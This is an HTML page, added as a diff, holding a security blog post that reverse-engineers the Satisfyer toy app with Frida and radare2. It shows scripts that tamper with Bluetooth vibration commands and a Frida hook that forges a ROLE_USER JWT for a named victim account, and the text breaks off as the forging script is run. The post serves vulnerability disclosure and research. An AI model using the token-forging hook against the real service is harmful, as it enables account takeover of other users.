@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+     
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Analysis of Satisfyer Toys: Discovering an Authentication Bypass with r2 and Frida</title>
+    <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">
+
+
+ <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">
+
+
+<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
+
+ 
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/python.min.js"></script> 
+<script src="/js/cpp.min.js"></script> 
+<script src="/js/json.min.js"></script> 
+<script src="/js/go.min.js"></script> 
+
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
+
+
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.83.1" />
+    
+
+    
+</head>
+
+
+
+
+<body>
+     
+    <nav class="navbar navbar-default navbar-fixed-top">
+
+        <div class="container">
+
+            <div class="navbar-header">
+
+                <a class="navbar-brand visible-xs" href="#">Analysis of Satisfyer Toys: Discovering an Authentication Bypass with r2 and Frida</a>
+
+                <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+
+            </div>
+
+            <div class="collapse navbar-collapse">
+
+                
+                <ul class="nav navbar-nav">
+                    
+                    <li><a href="/">Home</a></li>
+                    
+                    <li><a href="/post/">Posts</a></li>
+                    
+                    <li><a href="/project/">Projects</a></li>
+                    
+                </ul>
+                
+
+                
+                <ul class="nav navbar-nav navbar-right">
+                    
+                    <li class="navbar-icon"><a href="mailto:banana-#@#-bananamafia.dev"><i class="fa fa-envelope-o"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href=""><i class="fa fa-toggle-off"></i></a></li>
+                    
+                    <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=ao2GL3NAWQU"><i class="fa fa-envira"></i></a></li>
+                    
+                </ul>
+                
+
+            </div>
+
+        </div>
+
+    </nav>
+
+
+    <script>
+        
+        
+        
+
+        
+        $(".fa-toggle-off, .fa-toggle-on").parent().removeAttr("href");
+
+        
+        window.onload = setMode();
+
+        function isLightMode() {
+
+            const currentTheme = localStorage.getItem('bananamafia_theme') ? localStorage.getItem('bananamafia_theme') : null;
+
+            if (currentTheme == "light" || currentTheme == null) {
+                return true;
+            }
+            else {
+                return false;
+            }
+        }
+
+        function setMode() {
+            if (isLightMode()) {
+                setLight();
+            }
+            else {
+                setDark();
+            }
+        }
+
+        function setDark() {
+            document.documentElement.setAttribute('data-theme', 'dark');
+            localStorage.setItem('bananamafia_theme', 'dark');
+
+            $(".fa-toggle-off").each(function (i) {
+                $(this).removeClass("fa-toggle-off");
+                $(this).addClass("fa-toggle-on");
+            });
+            setAltImgs();
+        }
+
+        function setLight() {
+            document.documentElement.setAttribute('data-theme', 'light');
+            localStorage.setItem('bananamafia_theme', 'light');
+
+            $(".fa-toggle-on").each(function (i) {
+                $(this).removeClass("fa-toggle-on");
+                $(this).addClass("fa-toggle-off");
+            });
+            setAltImgs();
+        }
+
+        function setAltImgs() {
+            var lightMode = isLightMode();
+            $(".alt-img").each(function (idx) {
+                if (lightMode) {
+                    
+                    var newSrc = $(this).attr("src").replace("_dark", "");
+                }
+                else {
+                    
+                    var imgExt = $(this).attr("src").split(".").pop();
+                    var newSrc = $(this).attr("src").substr(0, $(this).attr("src").lastIndexOf(".")) + "_dark." + imgExt;
+                }
+
+                $(this).fadeOut(250, function () {
+                    $(this).attr("src", newSrc);
+                });
+                $(this).fadeIn(250);
+            });
+        }
+
+        $(".fa-toggle-off, .fa-toggle-on").on("click", function () {
+            const currentTheme = localStorage.getItem('bananamafia_theme') ? localStorage.getItem('bananamafia_theme') : null;
+            $("body").addClass("transition-bg");
+            $("nav").addClass("transition-bg");
+            if (currentTheme == "dark") {
+                setLight();
+            } else {
+                setDark();
+            }
+
+            setTimeout(function () {
+                $("body").removeClass("transition-bg");
+                $("nav").removeClass("transition-bg");
+            }, 500);
+
+        });
+
+        $(document).ready(function () {
+            
+            $(".fa-envira").parent().mouseenter(function () {
+                confetti.reset();
+
+                confetti({
+                    useWorker: true,
+                    particleCount: 200,
+                    angle: 90,
+                    spread: 70,
+                    origin: {
+                        x: 0.5, y: 1
+                    },
+                    startVelocity: 60
+                });
+            });
+            setAltImgs();
+        });
+    </script>
+
+
+<main id="main">
+
+    <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/satisfyer/">Analysis of Satisfyer Toys: Discovering an Authentication Bypass with r2 and Frida</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2frida"><kbd class="item-tag">r2frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/web"><kbd class="item-tag">web</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/vulnerability"><kbd class="item-tag">vulnerability</kbd></a>
+    
+
+</div>
+
+
+    <br>
+    <div class="content-width text-justify"><p>There&rsquo;s no good way to start a blog post like this, so let&rsquo;s dive right in:</p>
+<p>Recently, I&rsquo;ve re-discovered the <a href="https://github.com/smealum/butthax">butthax talk</a> which covered security aspects of <a href="https://lovense.com/">Lovense</a> devices. I&rsquo;ve felt so inspired, that I&rsquo;ve decided to buy some <a href="https://www.satisfyer.com/de/">Satisfyer</a> devices and check out how they work.</p>
+<p>These are app-controllable toys that are sold globally, first and foremost in Germany and all over the EU. They have some pretty interesting functionality:</p>
+<ul>
+<li>Control the device via Bluetooth using an <a href="https://play.google.com/store/apps/details?id=com.satisfyer.connect&amp;hl=de&amp;gl=US">Android app</a>. According to the description it&rsquo;s a <em>sexual joy and wellness app like no other</em>. o_O</li>
+<li>Create an account, find new friends and exchange messages and images. Given the nature of this app, it&rsquo;s quite interesting that Google Play allows everyone above <em>13</em> to download and use this app. Well OK.</li>
+<li>Start remote sessions and allow random dudes from the Internet or your friends to control the Satisfyer.</li>
+<li>Perform software updates.</li>
+</ul>
+<p>Throughout this post, I&rsquo;ll shed some light on how various aspects of some of these features work. Most importantly, I&rsquo;ve found an authentication bypass vulnerability that can result in an account takeover. This would have allowed me to forge authentication tokens for every user of the application.</p>
+<p>Let&rsquo;s start with some simple things first.</p>
+<h1 id="bluetooth-communication">Bluetooth Communication</h1>
+<p>Communication between an Android device and a Satisfyer is handled via Bluetooth LE. The app implements many <code>Controller</code> classes for various tasks, like handling low battery status or controlling the device&rsquo;s vibration. For example, the <code>ToyHolderController</code> class, like many others, implements the <code>sendBuffer()</code> method to send byte buffers to the device. The buffer contents can be logged with the following Frida script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span>() {
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stringclazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stringbuilderclazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;java.lang.StringBuilder&#39;</span>);
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.ble.control.ToyHolderController&#34;</span>);
+    <span style="color:#a6e22e">clazz</span>.<span style="color:#a6e22e">sendBuffer</span>.<span style="color:#a6e22e">overload</span>(<span style="color:#e6db74">&#34;java.util.List&#34;</span>).<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">lst</span>) {
+
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] sendBuffer(lst&lt;byte&gt;)&#34;</span>);
+
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stringbuilder</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stringbuilderclazz</span>.<span style="color:#a6e22e">$new</span>();
+        <span style="color:#a6e22e">stringbuilder</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">lst</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Buffer: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">stringbuilder</span>.<span style="color:#a6e22e">toString</span>());
+
+        <span style="color:#75715e">// call original
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sendBuffer</span>(<span style="color:#a6e22e">lst</span>);
+
+    }
+});
+</code></pre></div><p>Which yields:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sendBuffer<span style="color:#f92672">(</span>lst&lt;byte&gt;<span style="color:#f92672">)</span>
+Buffer: <span style="color:#f92672">[[</span>33, 33, 33, 33<span style="color:#f92672">]</span>, <span style="color:#f92672">[</span>25, 25, 25, 25<span style="color:#f92672">]]</span>
+</code></pre></div><p>Each list is associated to a specific motor of a Satisfyer. The values in a list control the vibration levels for a specific time frame.</p>
+<p>It seems that <code>66</code> is the maximum value for the vibration level. As an example how the communication could be manipulated with Frida, I&rsquo;ve decided to modify the list of bytes sent to the device to use the value <code>100</code> instead:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span>() {
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stringclazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stringbuilderclazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;java.lang.StringBuilder&#39;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">listclazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;java.util.List&#34;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arrayclazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;java.util.Arrays&#34;</span>);
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.ble.control.ToyHolderController&#34;</span>);
+    <span style="color:#a6e22e">clazz</span>.<span style="color:#a6e22e">sendBuffer</span>.<span style="color:#a6e22e">overload</span>(<span style="color:#e6db74">&#34;java.util.List&#34;</span>).<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">lst</span>) {
+
+        <span style="color:#75715e">// create a new byte array containing the value 100
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">byteList</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;java.util.ArrayList&#39;</span>).<span style="color:#a6e22e">$new</span>();
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">theByte</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#39;java.lang.Byte&#39;</span>).<span style="color:#a6e22e">valueOf</span>(<span style="color:#ae81ff">100</span>);
+        <span style="color:#a6e22e">byteList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">theByte</span>);
+        <span style="color:#a6e22e">byteList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">theByte</span>);
+        <span style="color:#a6e22e">byteList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">theByte</span>);
+        <span style="color:#a6e22e">byteList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">theByte</span>);
+
+        <span style="color:#a6e22e">lst</span>.<span style="color:#a6e22e">set</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">byteList</span>);
+        <span style="color:#a6e22e">lst</span>.<span style="color:#a6e22e">set</span>(<span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">byteList</span>);
+
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">stringbuilder</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stringbuilderclazz</span>.<span style="color:#a6e22e">$new</span>();
+        <span style="color:#a6e22e">stringbuilder</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">lst</span>);
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Buffer: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">stringbuilder</span>.<span style="color:#a6e22e">toString</span>());
+
+        <span style="color:#75715e">// call the original method with the modified parameter
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sendBuffer</span>(<span style="color:#a6e22e">lst</span>);
+
+    }
+});
+</code></pre></div><p>This worked and changed the scripts output to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sendBuffer<span style="color:#f92672">(</span>lst&lt;byte&gt;<span style="color:#f92672">)</span>
+Buffer: <span style="color:#f92672">[[</span>100, 100, 100, 100<span style="color:#f92672">]</span>, <span style="color:#f92672">[</span>100, 100, 100, 100<span style="color:#f92672">]]</span>
+</code></pre></div><p>Passing negative values, too long lists or things like that caused the device to ignore these input values.</p>
+<p>At this point, other commands sent to the Satisfyer could be altered as well. As can be seen, the easiest way to perform this kind of manipulation is changing values before passing them to the low-level functions of the Bluetooth stack.</p>
+<h1 id="internet-communication">Internet Communication</h1>
+<p>I&rsquo;ve analyzed the API and authentication flow using decompiled code and Burp. To make this work, I&rsquo;ve utilized the <a href="https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/">Universal Android SSL Pinning Bypass</a> script.</p>
+<h2 id="jwt-authentication">JWT Authentication</h2>
+<p>Each request sent to the server has to be authenticated using a JWT. It&rsquo;s interesting that the client and <em>not</em> the server is responsible for generating the <em>initial</em> JWT:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JwtTokenBuilder</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">JwtTokenBuilder</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        System<span style="color:#f92672">.</span><span style="color:#a6e22e">loadLibrary</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;native-lib&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#f92672">[...]</span>
+
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">getReleaseKey</span><span style="color:#f92672">();</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> String <span style="color:#a6e22e">createJwtToken</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        Date date <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Date<span style="color:#f92672">().</span><span style="color:#a6e22e">getTime</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">long</span><span style="color:#f92672">)</span>86400000<span style="color:#f92672">);</span>
+        Object object <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;prod&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hashCode</span><span style="color:#f92672">()</span> <span style="color:#f92672">!=</span> 3449687 <span style="color:#f92672">?</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDevKey</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getReleaseKey</span><span style="color:#f92672">();</span>
+        Charset charset <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span><span style="color:#a6e22e">a</span><span style="color:#f92672">;</span>
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>object <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            object <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>String<span style="color:#f92672">)</span>object<span style="color:#f92672">).</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(</span>charset<span style="color:#f92672">);</span>
+            l<span style="color:#f92672">.</span><span style="color:#a6e22e">b</span><span style="color:#f92672">(</span>object<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;(this as java.lang.String).getBytes(charset)&#34;</span><span style="color:#f92672">);</span>
+            object <span style="color:#f92672">=</span> Keys<span style="color:#f92672">.</span><span style="color:#a6e22e">hmacShaKeyFor</span><span style="color:#f92672">((</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[])</span>object<span style="color:#f92672">);</span>
+            object <span style="color:#f92672">=</span> Jwts<span style="color:#f92672">.</span><span style="color:#a6e22e">builder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setSubject</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Satisfyer&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">claim</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;auth&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;ROLE_ANONYMOUS_CLIENT&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">signWith</span><span style="color:#f92672">((</span>Key<span style="color:#f92672">)</span>object<span style="color:#f92672">).</span><span style="color:#a6e22e">setExpiration</span><span style="color:#f92672">(</span>date<span style="color:#f92672">).</span><span style="color:#a6e22e">compact</span><span style="color:#f92672">();</span>
+            <span style="color:#f92672">[...]</span>
+            <span style="color:#66d9ef">return</span> object<span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+        <span style="color:#f92672">[...];</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>As can be seen, <code>createJwtToken()</code> uses a JWT signing key originating from a native library called <code>libnative-lib.so</code>. It then signs and uses JWTs like the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{
+   <span style="color:#e6db74">&#34;alg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;HS512&#34;</span>
+}.{
+   <span style="color:#e6db74">&#34;sub&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Satisfyer&#34;</span>,
+   <span style="color:#e6db74">&#34;auth&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;ROLE_ANONYMOUS_CLIENT&#34;</span>,
+   <span style="color:#e6db74">&#34;exp&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1624144087</span>
+}
+</code></pre></div><p>After reviewing the authentication flow, I&rsquo;ve determined that there exist (at least) these roles:</p>
+<ul>
+<li><code>ROLE_ANONYMOUS_CLIENT</code> is any client that communicates with the Satisfyer API and is not logged in.</li>
+<li><code>ROLE_USER</code> is a client that has successfully logged in. Ever API request is scoped to information that&rsquo;s accessible to this specific user account.</li>
+</ul>
+<p>An authentication token for a signed in user looks as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{
+   <span style="color:#e6db74">&#34;alg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;HS512&#34;</span>
+}.{
+   <span style="color:#e6db74">&#34;sub&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;DieterBohlen1337&#34;</span>,
+   <span style="color:#e6db74">&#34;auth&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;ROLE_USER&#34;</span>,
+   <span style="color:#e6db74">&#34;user_id&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">282</span>[...],
+   <span style="color:#e6db74">&#34;exp&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1624194072</span>
+}
+</code></pre></div><p>While the Android app is responsible for generating the initial JWT with role <code>ROLE_ANONYMOUS_CLIENT</code>, the server responds with a new JWT after successfully performing a login. This new JWT uses the role <code>ROLE_USER</code>, as can be seen above.</p>
+<p>Would it be possible to use the signing key residing in the shared library to not just sign JWTs with <code>ROLE_ANONYMOUS_CLIENT</code>, but also with <code>ROLE_USER</code>? This would let an attacker to interact with the API in the name of someone else. Let&rsquo;s find out.</p>
+<h3 id="determining-the-user-id-of-a-victim">Determining the User ID of a Victim</h3>
+<p>We need two things to forge a JWT for any given account:</p>
+<ul>
+<li>The account name</li>
+<li>The user ID of the account</li>
+</ul>
+<p>Starting from an account name, determining the user ID is as simple as searching for the account using this API endpoint:</p>
+<p><img src="/img/satisfyer/search_user.png" alt="User Search"></p>
+<p>This can be done by any user with a valid session as <code>ROLE_USER</code>. Please note the value of the <code>statusDescription</code> in the server&rsquo;s response.</p>
+<h3 id="creating-forged-jwts-with-frida">Creating Forged JWTs with Frida</h3>
+<p>See, I&rsquo;m lazy banana man. So instead of dumping the key and creating the JWT myself, I&rsquo;ve used Frida to instrument the Satisfyer app to do this for me instead.</p>
+<p>The app uses a class implementing the <code>JwtBuilder</code> interface to create and sign JWTs. The only class implementing this interface is <code>DefaultJwtBuilder</code>, so I&rsquo;ve added hooks in there. The plan is as follows:</p>
+<ul>
+<li>Add a hook to change the <code>auth</code> claim from <code>ROLE_ANONYMOUS_USER</code> to <code>ROLE_USER</code>.</li>
+<li>Add a hook to add another claim called <code>user_id</code>, indicating the desired user ID of the victim&rsquo;s account.</li>
+<li>Change the JWT subject (<code>sub</code>) from <code>Satisfyer</code> (as it&rsquo;s used for anonymous users) to the account name of the victim.</li>
+</ul>
+<p>I came up with this Frida script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">perform</span>(<span style="color:#66d9ef">function</span>() {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;io.jsonwebtoken.impl.DefaultJwtBuilder&#34;</span>);
+    <span style="color:#a6e22e">clazz</span>.<span style="color:#a6e22e">claim</span>.<span style="color:#a6e22e">overload</span>(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>, <span style="color:#e6db74">&#34;java.lang.Object&#34;</span>).<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">name</span>, <span style="color:#a6e22e">val</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] Entered claim()&#34;</span>);
+
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Integer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;java.lang.Integer&#34;</span>);
+
+        <span style="color:#75715e">// the user ID of the victim
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">intInstance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Integer</span>.<span style="color:#a6e22e">valueOf</span>(<span style="color:#ae81ff">282</span>[...]);
+
+        <span style="color:#75715e">// modify the &#34;auth&#34; claim and add another claim for &#34;user_id&#34;
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">claim</span>(<span style="color:#a6e22e">name</span>, <span style="color:#e6db74">&#34;ROLE_USER&#34;</span>).<span style="color:#a6e22e">claim</span>(<span style="color:#e6db74">&#34;user_id&#34;</span>, <span style="color:#a6e22e">intInstance</span>);
+
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>;
+    }
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">clazz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;io.jsonwebtoken.impl.DefaultClaims&#34;</span>);
+    <span style="color:#a6e22e">clazz</span>.<span style="color:#a6e22e">setSubject</span>.<span style="color:#a6e22e">overload</span>(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>).<span style="color:#a6e22e">implementation</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">sub</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] Entered setSubject()&#34;</span>);
+
+        <span style="color:#75715e">// modify the subject from &#34;Satisfyer&#34; (anonymous user) to the victim&#39;s user name
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">setSubject</span>(<span style="color:#e6db74">&#34;victim[...]&#34;</span>);
+    }
+
+    <span style="color:#75715e">// Trigger JWT generation
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">JwtTokenBuilderClass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Java</span>.<span style="color:#a6e22e">use</span>(<span style="color:#e6db74">&#34;com.coreteka.satisfyer.api.jwt.JwtTokenBuilder&#34;</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jwtTokenBuilder</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JwtTokenBuilderClass</span>.<span style="color:#a6e22e">$new</span>();
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[*] Got Token:&#34;</span>);
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">jwtTokenBuilder</span>.<span style="color:#a6e22e">createJwtToken</span>());
+
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;[+] Hooking complete&#34;</span>)
+});
+</code></pre></div><p>This worked just fine and generated a forged JWT when starting the app:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 forge_token.py
